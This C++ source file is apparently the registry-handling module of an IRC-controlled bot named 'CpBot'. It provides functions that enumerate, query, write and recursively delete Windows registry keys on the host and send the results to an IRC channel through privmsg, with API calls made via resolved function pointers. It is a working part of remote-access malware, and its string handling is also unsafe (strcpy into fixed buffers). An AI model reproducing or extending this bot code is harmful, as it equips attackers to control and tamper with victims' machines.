//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//

#include "includes.h"
#include "functions.h"

HKEY GetKey(char *skey)
{
	if (!strcmp("HKEY_LOCAL_MACHINE",skey) || !strcmp("HKLM",skey))
		return HKEY_LOCAL_MACHINE;
	
	else if (!strcmp("HKEY_CURRENT_USER",skey) || !strcmp("HKCU",skey))
		return HKEY_CURRENT_USER;
	
	else if (!strcmp("HKEY_CLASSES_ROOT",skey) || !strcmp("HKCR",skey))
		return HKEY_CLASSES_ROOT;
	
	else if (!strcmp("HKEY_CURRENT_CONFIG",skey) || !strcmp("HKCC",skey))
		return HKEY_CURRENT_CONFIG;
	
	else if (!strcmp("HKEY_USERS",skey) || !strcmp("HKU",skey))
		return HKEY_USERS;
	
	return HKEY_LOCAL_MACHINE;
}

char *GetKey(HKEY root,BOOL sh)
{
	if (root==HKEY_LOCAL_MACHINE)
		if (!sh)
			return "HKEY_LOCAL_MACHINE";
		else
			return "HKLM";
	
	else if (root==HKEY_CURRENT_USER)
		if (!sh)
			return "HKEY_CURRENT_USER";
		else
			return "HKCU";
	
	else if (root==HKEY_CLASSES_ROOT)
		if (!sh)
			return "HKEY_CLASSES_ROOT";
		else
			return "HKCR";
	
	else if (root==HKEY_CURRENT_CONFIG)
		if (!sh)
			return "HKEY_CURRENT_CONFIG";
		else
			return "HKCC";
	
	else if (root==HKEY_USERS)
		if (!sh)
			return "HKEY_USERS";
		else
			return "HKU";
	
	if (!sh)
		return "HKEY_LOCAL_MACHINE";
	else
		return "HKLM";
}

DWORD GetType(char *key)
{
	if (!lstrcmpi(key,"REG_SZ") || !lstrcmpi(key,"SZ"))
		return REG_SZ;
	
	if (!lstrcmpi(key,"REG_EXPAND_SZ") || !lstrcmpi(key,"EX"))
		return REG_EXPAND_SZ;
	
	if (!lstrcmpi(key,"REG_MULTI_SZ") || !lstrcmpi(key,"MU"))
		return REG_MULTI_SZ;
	
	if (!lstrcmpi(key,"REG_DWORD") || !lstrcmpi(key,"DW"))
		return REG_DWORD;
	
	return REG_SZ;
}

char *GetType(DWORD type)
{
	switch (type)
	{
	case REG_SZ:
		return "REG_SZ";
		break;
	case REG_DWORD:
		return "REG_DWORD";
		break;
	case REG_EXPAND_SZ:
		return "REG_EXPAND_SZ";
		break;
	case REG_MULTI_SZ:
		return "REG_MULTI_SZ";
		break;
	case REG_BINARY:
		return "REG_BINARY";
		break;
	//case REG_DWORD_LITTLE_ENDIAN:
	//	return "REG_DWORD_LITTLE_ENDIAN";
	//	break;
	case REG_DWORD_BIG_ENDIAN:
		return "REG_DWORD_BIG_ENDIAN";
		break;
	case REG_LINK:
		return "REG_LINK";
		break;
	case REG_NONE:
		return "REG_NONE";
		break;
	case REG_QWORD:
		return "REG_QWORD";
		break;
	//case REG_QWORD_LITTLE_ENDIAN:
	//	return "REG_QWORD_LITTLE_ENDIAN";
	//	break;
	default:
		return "UNKNOWN";
		break;
	}
}

BOOL RegDelete(HKEY root,LPCTSTR subkey,LPCTSTR name)
{
	HKEY key=NULL;
	if (!subkey)
		return FALSE;

	if (!name)
	{
		if (fRegDeleteKey(root,subkey) == ERROR_SUCCESS) 
			return TRUE;
		
		DWORD inx = 0;
		DWORD chr = 256;
		char buf[256] = {0};
		FILETIME ftm;
		
		if (fRegOpenKeyEx(root,subkey,0,KEY_READ|KEY_WRITE,&key) == ERROR_SUCCESS)
		{
			DWORD cnt = fRegEnumKeyEx(key,inx,buf,&chr,NULL,NULL,NULL,&ftm);
			while ((cnt != ERROR_NO_MORE_ITEMS) && (cnt == ERROR_SUCCESS)) {
				RegDelete(root,subkey,buf);
				cnt = fRegEnumKeyEx(key,(inx++),buf,&chr,NULL,NULL,NULL,&ftm);
			}
			
			fRegDeleteKey(key,subkey);
		}
	}
	else
	{
		if (fRegOpenKeyEx(root,subkey,0,KEY_READ|KEY_WRITE,&key) == ERROR_SUCCESS)
		{
			if (fRegDeleteValue(key,name) == ERROR_SUCCESS)
			{
				fRegCloseKey(key);
				return TRUE;
			}
			fRegCloseKey(key);
		}
	}

	return FALSE;
}

BOOL RegExists(HKEY root,LPCTSTR subkey,char *name,DWORD type)
{
	BOOL bRet=FALSE;
	HKEY key=NULL;
	if (!subkey || !name)
		return bRet;
	if (fRegOpenKeyEx(root,subkey,0,KEY_READ|KEY_WRITE,&key) == ERROR_SUCCESS)
	{
		if (type==REG_DWORD)
		{
			BOOL success=FALSE;
			DWORD dwRet=RegQuery(root,subkey,name,&success);
			if (success)
				bRet=TRUE;
			else
				bRet=FALSE;
		}
		else if (type==REG_SZ || type==REG_EXPAND_SZ || type==REG_MULTI_SZ)
		{
			char *szRet=RegQuery(root,subkey,name,REG_SZ);
			if (szRet)
				bRet=TRUE;
			else
				bRet=FALSE;
		}
		fRegCloseKey(key);
	}
	return bRet;
}

BOOL RegQuery(HKEY root,LPCTSTR subkey,char *target,void *conn)
{
	IRC* irc=(IRC*)conn;
	HKEY key=NULL;
	DWORD dwRet; 
	DWORD cSubKeys=0;// number of subkeys 
	DWORD cValues;// number of values for key 
	DWORD dwMaxSubKey;// longest subkey size 
	DWORD dwMaxClass;// longest class string 
	DWORD dwMaxValue;// longest value name 
	DWORD dwMaxValueData;// longest value data 
	DWORD dwsd;// size of security descriptor 
	
	char szKeyName[MAX_KEY_LENGTH];
	DWORD dwKeySize=MAX_KEY_LENGTH;
	TCHAR  szValueName[MAX_VALUE_NAME];
	DWORD dwValueSize=MAX_VALUE_NAME;
	DWORD dwValueType;

	char szKeyClass[128];
	DWORD dwClassSize=sizeof(szKeyClass);
	
	FILETIME lpft;
	int i;
	int isent=0;
	//static char szRegBuffer[65535+2];
	//ZeroMemory(szRegBuffer,65535);
    
	if(fRegOpenKeyEx(root,subkey,0,KEY_ALL_ACCESS,&key) == ERROR_SUCCESS)
	{
		// Get the class name and the value count. 
		dwRet=fRegQueryInfoKey(key,szKeyClass,&dwClassSize,NULL,&cSubKeys,&dwMaxSubKey,
			&dwMaxClass,&cValues,&dwMaxValue,&dwMaxValueData,&dwsd,&lpft);
		
		int t=0;
		// Enumerate the subkeys
		if (cSubKeys)
		{
			//irc->privmsg(target,"%s Number of subkeys: %d",reg_title,cSubKeys);
			for (i=0; i<cSubKeys; i++,t++) 
			{ 
				dwKeySize=MAX_KEY_LENGTH;
				dwRet=fRegEnumKeyEx(key,i,szKeyName,&dwKeySize,NULL,NULL,NULL,&lpft); 
				if (dwRet == ERROR_SUCCESS) 
				{
					irc->privmsg(target,"(%.2d) %s\\%s",t+1,subkey,szKeyName);
					isent++;
				}
			}
		} 

		
		// Enumerate the key values. 
		if (cValues) 
		{
			//irc->privmsg(target,"Number of values: %d",cValues);
			for (i=0, dwRet=ERROR_SUCCESS; i<cValues; i++,t++) 
			{
				dwValueSize=MAX_KEY_LENGTH;
				szValueName[0] = '\0'; 
				dwRet=fRegEnumValue(key,i,szValueName,&dwValueSize,NULL,&dwValueType,NULL,NULL);
				if (dwRet == ERROR_SUCCESS) 
				{
					if (!strcmp(szValueName,"") && dwValueType==REG_SZ)
						sprintf(szValueName,"(Default)");
					irc->privmsg(target,"(%.2d) %s\\%s (%s)",t+1,subkey,szValueName,GetType(dwValueType));
					isent++;
				}
			}
		}

		fRegCloseKey(key);
	}
	else
		return FALSE;
	if (isent>0)
		return TRUE;
	return FALSE;
}

DWORD RegQuery(HKEY root,LPCTSTR subkey,LPCTSTR name,BOOL &success)
{	
	HKEY key=NULL;
	DWORD dwType=REG_DWORD,dwSize=sizeof(DWORD),dwRead=0;
	if(fRegOpenKeyEx(root,subkey,0,KEY_ALL_ACCESS,&key)==ERROR_SUCCESS)
	{
		if(fRegQueryValueEx(key,name,NULL,&dwType,(LPBYTE)&dwRead,&dwSize)==ERROR_SUCCESS)
		{
			fRegCloseKey(key);
			success=TRUE;
			return dwRead;
		}
		fRegCloseKey(key);
	}
	success=FALSE;
	return 0;
}

char *RegQuery(HKEY root,LPCTSTR subkey,LPCTSTR name,DWORD type/*=REG_SZ*/)
{	
	HKEY key=NULL;
	DWORD dwRes=65535;
	static char szRegBuffer[65535+2];
	ZeroMemory(szRegBuffer,65535);
	if(fRegOpenKeyEx(root,subkey,0,KEY_ALL_ACCESS,&key) == ERROR_SUCCESS)
	{
		if(fRegQueryValueEx(key,name,NULL,NULL,(unsigned char *)szRegBuffer,&dwRes) == ERROR_SUCCESS)
		{
			if (type==REG_MULTI_SZ)
			{
				szRegBuffer[dwRes] = '\0';	// Ensure termination

				// Skip back through ALL the null chars first
				while (szRegBuffer[dwRes]=='\0' && dwRes != 0)
					--dwRes;

				for (unsigned int i=0; i<dwRes; ++i)
				{
					if (szRegBuffer[i]=='\0')
						szRegBuffer[i]='\n'; // Convert to \n
				}
			}
			fRegCloseKey(key);
			return szRegBuffer;
		}
		fRegCloseKey(key);
	}
	return '\0';
}

BOOL RegWrite(HKEY root,char *subkey,char *name,DWORD data)
{	
	RQUERY rq;
	rq.dwQuery=data;
	return RegWrite(root,subkey,name,REG_DWORD,rq);
}

BOOL RegWrite(HKEY root,char *subkey,char *name,char *data,DWORD type/*=REG_SZ*/)
{	
	RQUERY rq;
	BOOL bret=FALSE;

	rq.szQuery=data;
	
	if (type==REG_SZ)
		bret=RegWrite(root,subkey,name,REG_SZ,rq);

	else if (type==REG_EXPAND_SZ)
		bret=RegWrite(root,subkey,name,REG_EXPAND_SZ,rq);

	else if (type==REG_MULTI_SZ)
		bret=RegWrite(root,subkey,name,REG_MULTI_SZ,rq);

	else
		bret=FALSE;
	
	return bret;
}

BOOL RegWrite(HKEY hKey,LPCTSTR SubKey,LPCTSTR KeyName,DWORD Type,RQUERY Data)
{
	HKEY	hRegKey;
	DWORD	dwBuf;
	char	szRegBuffer[65535+2]; // Only allow writing of 64Kb to a key, include space for double null
	int		i, nLen;

	// Open the registry key
	if (fRegCreateKeyEx(hKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_WRITE,NULL,&hRegKey,NULL) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	// If no keyname then we are finished
	if (KeyName == 0)
	{
		fRegCloseKey(hRegKey);
		return TRUE;
	}

	// Write the registry differently depending on type of variable we are writing
	switch (Type)
	{

	case REG_EXPAND_SZ:
		nLen=(int)strlen(Data.szQuery);
		strcpy(szRegBuffer,Data.szQuery);
		if (fRegSetValueEx(hRegKey,KeyName,0,REG_EXPAND_SZ,(CONST BYTE *)szRegBuffer,(DWORD)nLen+1) != ERROR_SUCCESS)
		{
			fRegCloseKey(hRegKey);
			return FALSE;
		}

		break;

	case REG_SZ:
		nLen=(int)strlen(Data.szQuery);
		strcpy(szRegBuffer,Data.szQuery);
		if (fRegSetValueEx(hRegKey,KeyName,0,REG_SZ,(CONST BYTE *)szRegBuffer,(DWORD)nLen+1) != ERROR_SUCCESS)
		{
			fRegCloseKey(hRegKey);
			return FALSE;
		}

		break;

	case REG_DWORD:
		dwBuf=Data.dwQuery;
		if (fRegSetValueEx(hRegKey,KeyName,0,REG_DWORD,(CONST BYTE *)&dwBuf,sizeof(dwBuf)) != ERROR_SUCCESS)
		{
			fRegCloseKey(hRegKey);
			return FALSE;
		}

		break;

	case REG_MULTI_SZ:
		nLen=(int)strlen(Data.szQuery);	
		strcpy(szRegBuffer,Data.szQuery);

		// Change all \n to \0 then double null terminate
		szRegBuffer[nLen]='\0';				// Double null
		szRegBuffer[nLen+1]='\0';

		for (i=0;i<nLen;++i)
			if (szRegBuffer[i]=='\n')
				szRegBuffer[i]='\0';

		// If blank then must use nLen = 0, ignoring \0\0 (blank values not allowed)
		// Otherwise take our stringlen + 2 (double null) as the size
		if (nLen != 0)
			nLen = nLen + 2;

		if (fRegSetValueEx(hRegKey,KeyName,0,REG_MULTI_SZ,(CONST BYTE *)szRegBuffer,(DWORD)nLen) != ERROR_SUCCESS)
		{
			fRegCloseKey(hRegKey);
			return FALSE;
		}
		break;

	default:
		fRegCloseKey(hRegKey);
		return FALSE;
		break;

	}

	fRegCloseKey(hRegKey);
	return TRUE;

}
